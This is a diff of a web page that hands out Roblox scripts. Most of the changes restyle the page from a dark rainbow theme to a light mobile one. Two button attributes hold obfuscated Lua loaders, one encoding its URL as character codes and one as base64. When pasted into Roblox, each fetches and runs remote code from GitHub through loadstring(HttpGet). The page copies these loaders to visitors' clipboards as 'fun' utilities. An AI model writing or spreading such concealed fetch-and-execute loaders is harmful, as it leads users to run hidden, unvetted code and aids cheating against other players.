@@ -2,90 +2,76 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Eldar's Scripts</title>
     
     <!-- PWA Manifest -->
     <link rel="manifest" href="manifest.json">
-    <meta name="theme-color" content="#0a0a0a">
+    <meta name="theme-color" content="#F5F5F7">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
     
     <style>
         :root {
-            --text: #f1f1f1;
-            --bg: #0a0a0a;
-            --border: rgba(255, 255, 255, 0.1);
-            --button-bg: rgba(30, 30, 30, 0.7);
+            --text: #000000;
+            --bg: #F5F5F7;
+            --border: rgba(0, 0, 0, 0.1);
+            --button-bg: #007AFF;
+            --button-text: #FFFFFF;
+            --search-bg: rgba(0, 0, 0, 0.08);
+            --search-border: rgba(0, 0, 0, 0.2);
+            --notification-bg: rgba(255, 255, 255, 0.95);
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-family: -apple-system, SF Pro, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
 
         body {
             background-color: var(--bg);
             color: var(--text);
             min-height: 100vh;
-            background-image: url('https://krnl.cat/img/bg.png');
-            background-size: cover;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
             display: flex;
             flex-direction: column;
             align-items: center;
+            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
             overflow-x: hidden;
         }
 
         .container {
             width: 100%;
-            max-width: 800px;
-            padding: 0 20px;
+            max-width: 600px;
+            padding: 0 16px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            position: relative;
-            z-index: 1;
         }
 
         header {
             text-align: center;
-            padding: 80px 0 40px;
+            padding: 44px 0 24px;
             width: 100%;
-            position: relative;
         }
 
         .logo {
-            font-size: clamp(2.5rem, 8vw, 3.5rem);
-            font-weight: 800;
-            margin-bottom: 20px;
-            background: linear-gradient(90deg, #ff0000, #ff8000, #ffff00, #00ff00, #0000ff, #8000ff, #ff00ff);
-            background-size: 400% 400%;
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 15px rgba(255,255,255,0.3);
-            position: relative;
-            display: inline-block;
-            animation: rainbow-text 8s ease infinite;
+            font-size: 34px;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 8px;
         }
 
-        .logo::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, #ff0000, #ff8000, #ffff00, #00ff00, #0000ff, #8000ff, #ff00ff);
-            background-size: 400% 400%;
-            box-shadow: 0 0 15px rgba(255,255,255,0.5);
-            border-radius: 2px;
-            animation: rainbow-border 8s ease infinite;
+        .subtitle {
+            font-size: 17px;
+            color: #6E6E73;
+            margin-bottom: 16px;
         }
 
-        /* Cosmic Background Elements */
+        /* Subtle Background Elements */
         .cosmic-bg {
             position: fixed;
             top: 0;
@@ -94,253 +80,173 @@
             height: 100%;
             z-index: -1;
             overflow: hidden;
+            background: linear-gradient(180deg, rgba(245,245,247,1) 0%, rgba(235,235,240,1) 100%);
         }
 
         .star {
             position: absolute;
-            background: rgba(255,255,255,0.9);
+            background: rgba(0,0,0,0.1);
             border-radius: 50%;
-            filter: blur(0.5px);
-            box-shadow: 0 0 5px 1px rgba(255,255,255,0.7);
-            animation: 
-                twinkle 3s infinite ease-in-out alternate,
-                drift linear infinite;
-        }
-
-        @keyframes drift {
-            0% { transform: translateX(100vw) translateY(0); }
-            100% { transform: translateX(-20vw) translateY(20vh); }
+            width: 2px;
+            height: 2px;
+            animation: twinkle 2s infinite ease-in-out alternate;
         }
 
         @keyframes twinkle {
-            0%, 100% { opacity: 0.5; }
-            50% { opacity: 1; }
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.8; }
         }
 
-        /* AI Search Styles */
+        /* Search Bar */
         .search-container {
             width: 100%;
-            max-width: 600px;
-            margin-bottom: 30px;
-            opacity: 0;
-            transform: translateY(20px);
-            animation: fadeInUp 0.8s ease-out 0.5s forwards;
+            margin-bottom: 24px;
         }
 
         .search-box {
             width: 100%;
-            padding: 15px 20px;
-            border-radius: 8px;
-            border: none;
-            background: rgba(30, 30, 30, 0.7);
-            color: white;
-            font-size: 1rem;
-            backdrop-filter: blur(5px);
-            box-shadow: 0 0 0 1px rgba(255,255,255,0.1);
-            transition: all 0.3s ease;
+            padding: 10px 16px;
+            border-radius: 10px;
+            border: 1px solid var(--search-border);
+            background: var(--search-bg);
+            color: var(--text);
+            font-size: 17px;
+            transition: border-color 0.2s ease;
         }
 
         .search-box:focus {
             outline: none;
-            box-shadow: 0 0 0 2px rgba(138, 43, 226, 0.5);
+            border-color: var(--button-bg);
         }
 
         .search-results {
-            margin-top: 15px;
-            background: rgba(20, 20, 20, 0.9);
-            border-radius: 8px;
-            padding: 15px;
+            margin-top: 8px;
+            background: var(--notification-bg);
+            border-radius: 10px;
+            padding: 8px;
             max-height: 300px;
             overflow-y: auto;
             display: none;
-            backdrop-filter: blur(10px);
             border: 1px solid var(--border);
+            backdrop-filter: blur(10px);
         }
 
         .script-item {
-            padding: 10px;
-            border-radius: 4px;
+            padding: 12px;
+            border-radius: 8px;
             cursor: pointer;
             transition: background 0.2s ease;
         }
 
         .script-item:hover {
-            background: rgba(255,255,255,0.1);
+            background: rgba(0,0,0,0.05);
         }
 
         .button-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
+            grid-template-columns: 1fr;
+            gap: 12px;
             width: 100%;
-            padding: 0 20px;
         }
 
         .script-btn {
             background: var(--button-bg);
             border: none;
-            color: transparent;
-            padding: 18px;
-            border-radius: 8px;
-            font-size: 1.1rem;
+            color: var(--button-text);
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
             display: flex;
             align-items: center;
             justify-content: center;
             text-align: center;
-            height: 100%;
-            position: relative;
-            overflow: hidden;
-            z-index: 1;
-            opacity: 0;
-            transform: translateY(20px);
-            box-shadow: 0 0 0 1px rgba(255,255,255,0.1);
-            animation: fadeInUp 0.6s ease-out 0.7s forwards;
-        }
-
-        .script-btn span {
-            background: linear-gradient(90deg, #ff0000, #ff8000, #ffff00, #00ff00, #0000ff, #8000ff, #ff00ff);
-            background-size: 400% 400%;
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 10px rgba(255,255,255,0.3);
-            animation: rainbow-text 8s ease infinite;
-            position: relative;
-            z-index: 2;
-        }
-
-        .script-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, 
-                rgba(255, 0, 0, 0.2), 
-                rgba(255, 128, 0, 0.2), 
-                rgba(255, 255, 0, 0.2), 
-                rgba(0, 0, 255, 0.2), 
-                rgba(128, 0, 255, 0.2), 
-                rgba(255, 0, 255, 0.2));
-            background-size: 400% 400%;
-            opacity: 0;
-            z-index: 1;
-            transition: opacity 0.3s ease;
-            animation: rainbow-bg 8s ease infinite;
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
         }
 
         .script-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        }
-
-        .script-btn:hover::before {
-            opacity: 1;
+            background: #005BB5;
         }
 
         .script-btn:active {
-            transform: translateY(0);
+            background: #003087;
+            transform: scale(0.98);
         }
 
         .info-text {
-            color: #aaa;
-            margin-top: 40px;
+            color: #6E6E73;
+            margin-top: 24px;
             text-align: center;
-            line-height: 1.6;
-            opacity: 0;
-            transform: translateY(20px);
-            animation: fadeInUp 0.8s ease-out 1.1s forwards;
-            max-width: 600px;
-            padding: 0 20px;
+            font-size: 15px;
+            line-height: 1.4;
         }
 
         .coming-soon {
-            color: #888;
-            margin-top: 20px;
+            color: #6E6E73;
+            margin-top: 16px;
+            font-size: 15px;
             font-style: italic;
             text-align: center;
-            opacity: 0;
-            transform: translateY(20px);
-            animation: fadeInUp 0.8s ease-out 1.3s forwards;
         }
 
         .highlight {
             font-weight: 600;
-            background: linear-gradient(90deg, #ff0000, #ff8000, #ffff00, #00ff00, #0000ff, #8000ff, #ff00ff);
-            background-size: 400% 400%;
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 10px rgba(255,255,255,0.3);
-            animation: rainbow-text 8s ease infinite;
-            padding: 0 5px;
-            border-radius: 4px;
+            color: var(--button-bg);
         }
 
         footer {
             margin-top: auto;
-            padding: 30px 0;
+            padding: 20px 0;
             text-align: center;
-            color: #666;
-            font-size: 0.9rem;
+            color: #6E6E73;
+            font-size: 13px;
             width: 100%;
-            opacity: 0;
-            animation: fadeIn 1s ease-out 1.3s forwards;
-            backdrop-filter: blur(5px);
-            background: rgba(10, 10, 10, 0.5);
+            background: rgba(245,245,247,0.9);
             border-top: 1px solid var(--border);
         }
 
         .footer-logo {
             font-weight: 700;
-            background: linear-gradient(90deg, #ff0000, #ff8000, #ffff00, #00ff00, #0000ff, #8000ff, #ff00ff);
-            background-size: 400% 400%;
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 15px rgba(255,255,255,0.3);
-            animation: rainbow-text 8s ease infinite;
+            color: var(--button-bg);
         }
 
         /* Notification System */
         .notification-container {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
+            top: env(safe-area-inset-top, 20px);
+            right: 16px;
+            left: 16px;
             z-index: 1000;
             display: flex;
-            flex-direction: column-reverse;
-            gap: 10px;
-            max-width: 300px;
+            flex-direction: column;
+            gap: 8px;
         }
 
         .notification {
-            background: rgba(0, 0, 0, 0.7);
+            background: var(--notification-bg);
             backdrop-filter: blur(10px);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.1);
+            color: var(--text);
+            padding: 12px 16px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            border: 1px solid var(--border);
             display: flex;
             align-items: center;
-            gap: 10px;
-            transform: translateX(100%);
+            gap: 8px;
+            transform: translateY(-20px);
             opacity: 0;
             animation: slideIn 0.3s ease-out forwards;
-            transition: all 0.3s ease;
         }
 
         .notification.success {
-            border-left: 3px solid #4CAF50;
+            border-left: 4px solid #34C759;
         }
 
         .notification.error {
-            border-left: 3px solid #F44336;
+            border-left: 4px solid #FF3B30;
         }
 
         .notification.exiting {
@@ -348,13 +254,13 @@
         }
 
         @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
 
         @keyframes slideOut {
-            from { transform: translateX(0); opacity: 1; }
-            to { transform: translateX(100%); opacity: 0; }
+            from { transform: translateY(0); opacity: 1; }
+            to { transform: translateY(-20px); opacity: 0; }
         }
 
         /* Animations */
@@ -363,54 +269,26 @@
             to { opacity: 1; }
         }
 
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes rainbow-text {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        @keyframes rainbow-border {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        @keyframes rainbow-bg {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
         /* Responsive adjustments */
-        @media (max-width: 768px) {
+        @media (max-width: 414px) {
             header {
-                padding: 60px 0 30px;
+                padding: 32px 0 16px;
             }
             
-            .button-grid {
-                grid-template-columns: 1fr;
-                gap: 15px;
+            .logo {
+                font-size: 28px;
+            }
+            
+            .subtitle {
+                font-size: 15px;
             }
             
             .script-btn {
-                padding: 16px;
-                font-size: 1rem;
-            }
-
-            .notification-container {
-                max-width: 90%;
-                left: 5%;
-                right: 5%;
-                bottom: 10px;
+                padding: 14px;
+                font-size: 16px;
             }
         }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="cosmic-bg" id="cosmicBg"></div>
@@ -422,20 +300,18 @@
             <p class="subtitle">Simple Roblox utilities for fun gameplay</p>
         </header>
 
-        <!-- AI Search Box -->
+        <!-- Search Bar -->
         <div class="search-container">
-            <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search scripts...">
+            <input type="text" class="search-box" id="searchBox" placeholder="Search scripts...">
             <div class="search-results" id="searchResults"></div>
         </div>
 
         <div class="button-grid">
-            <!-- Original button -->
             <button class="script-btn" data-script-name="AnvilVoider" data-script-content='local a=game local b=a.HttpGet local c=function(d)return string.char(d)end local e={104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,117,122,105,107,105,108,108,97,122,47,115,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,70,108,97,115,104,80,114,111,116,101,99,116,46,116,120,116} local f="" for _,g in pairs(e) do f=f..c(g) end loadstring(b(a,f))()'>
-                <span>Anvil Voider 2.0</span>
+                Anvil Voider 2.0
             </button>
-            <!-- New Power Script button -->
             <button class="script-btn" data-script-name="Power Script" data-script-content='local function d(b)local c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"b=string.gsub(b,"[^"..c.."=]","")return(b:gsub(".",function(x)if(x=="=")then return""end local r,f="",(c:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and"1"or"0")end return r end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)if(#x~=8)then return""end local n=0 for i=1,8 do n=n+(x:sub(i,i)=="1"and 2^(8-i)or 0)end return string.char(n)end))end;loadstring(game:HttpGet(d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3V6aWtpbGxhei9zY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9Qb3dlclNjcmlwdA==")))()'>
-                <span>Power Script 1.2</span>
+                Power Script 1.2
             </button>
         </div>
 
@@ -451,7 +327,7 @@
     </footer>
 
     <script>
-        // Script database for AI search
+        // Script database for search
         const scriptDatabase = [
             { 
                 name: "Anvil Voider 2.0", 
@@ -461,49 +337,23 @@
             }
         ];
 
-        // Enhanced Cosmic Background with visible stars
+        // Subtle Background
         function createCosmicBackground() {
             const cosmicBg = document.getElementById('cosmicBg');
-            cosmicBg.innerHTML = ''; // Clear existing stars
-            
-            // Create stars with uniform movement
-            for (let i = 0; i < 150; i++) {
+            cosmicBg.innerHTML = '';
+            for (let i = 0; i < 50; i++) {
                 const star = document.createElement('div');
                 star.className = 'star';
-                
-                // Random position (starting from right side)
-                star.style.left = `${Math.random() * 120}vw`;
+                star.style.left = `${Math.random() * 100}vw`;
                 star.style.top = `${Math.random() * 100}vh`;
-                
-                // Random size
-                const size = Math.random() * 2 + 0.5;
-                star.style.width = `${size}px`;
-                star.style.height = `${size}px`;
-                
-                // Random opacity
-                star.style.opacity = Math.random() * 0.7 + 0.3;
-                
-                // Uniform speed with slight variation
-                const duration = 40 + Math.random() * 30; // 40-70 seconds
-                star.style.animationDuration = `${3}s, ${duration}s`;
-                star.style.animationDelay = `${Math.random() * 5}s, 0s`;
-                
+                star.style.animationDelay = `${Math.random() * 2}s`;
                 cosmicBg.appendChild(star);
             }
         }
 
-        // Notification system
+        // Notification System
         function showNotification(message, type = 'success') {
             const container = document.getElementById('notificationContainer');
-            
-            // Remove existing notifications
-            const existingNotifications = container.querySelectorAll('.notification');
-            existingNotifications.forEach(notification => {
-                notification.classList.add('exiting');
-                setTimeout(() => notification.remove(), 300);
-            });
-            
-            // Create new notification
             const notification = document.createElement('div');
             notification.className = `notification ${type}`;
             
@@ -517,14 +367,13 @@
             notification.appendChild(text);
             container.appendChild(notification);
             
-            // Auto-remove after 3 seconds
             setTimeout(() => {
                 notification.classList.add('exiting');
                 setTimeout(() => notification.remove(), 300);
             }, 3000);
         }
 
-        // AI Search Functionality
+        // Search Functionality
         function setupSearch() {
             const searchBox = document.getElementById('searchBox');
             const searchResults = document.getElementById('searchResults');
@@ -537,7 +386,6 @@
                     return;
                 }
                 
-                // Simple AI-like search
                 const results = scriptDatabase.filter(script => {
                     return script.name.toLowerCase().includes(query) || 
                            script.description.toLowerCase().includes(query) ||
@@ -567,7 +415,6 @@
                 }
             });
             
-            // Hide results when clicking outside
             document.addEventListener('click', function(e) {
                 if (!searchBox.contains(e.target) && !searchResults.contains(e.target)) {
                     searchResults.style.display = 'none';
@@ -575,24 +422,16 @@
             });
         }
 
-        // Copy script to clipboard
-        function copyScript(button, name, content) {
-            // If content wasn't passed directly, get it from data attribute
+        // Copy Script to Clipboard
+        function copyScript(element, name, content) {
             if (!content) {
-                name = button.getAttribute('data-script-name');
-                content = button.getAttribute('data-script-content');
+                name = element.getAttribute('data-script-name');
+                content = element.getAttribute('data-script-content');
             }
             
-            // Store original button state
-            const originalHTML = button.innerHTML;
-            
-            // Change button to grey state
-            button.innerHTML = `<span style="
-                background: none;
-                color: var(--text);
-                text-shadow: none;
-                -webkit-text-fill-color: initial;
-            ">${name}</span>`;
+            const originalHTML = element.innerHTML;
+            element.innerHTML = `${name}`;
+            element.style.background = '#6E6E73';
             
             navigator.clipboard.writeText(content)
                 .then(() => {
@@ -603,30 +442,26 @@
                     showNotification(`Failed to copy ${name}`, 'error');
                 })
                 .finally(() => {
-                    // Return button to original state after 1 second
                     setTimeout(() => {
-                        button.innerHTML = originalHTML;
+                        element.innerHTML = originalHTML;
+                        element.style.background = '';
                     }, 1000);
                 });
         }
 
-        // Initialize effects
+        // Initialize
         window.addEventListener('DOMContentLoaded', () => {
             createCosmicBackground();
             setupSearch();
             
-            // Add click handlers to all script buttons
             document.querySelectorAll('.script-btn').forEach(button => {
                 button.addEventListener('click', () => copyScript(button));
             });
             
-            // Adjust on resize
-            window.addEventListener('resize', () => {
-                createCosmicBackground();
-            });
+            window.addEventListener('resize', createCosmicBackground);
         });
 
-        // PWA Service Worker Registration
+        // PWA Service Worker
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('sw.js')
                 .then(reg => console.log('Service Worker registered:', reg))
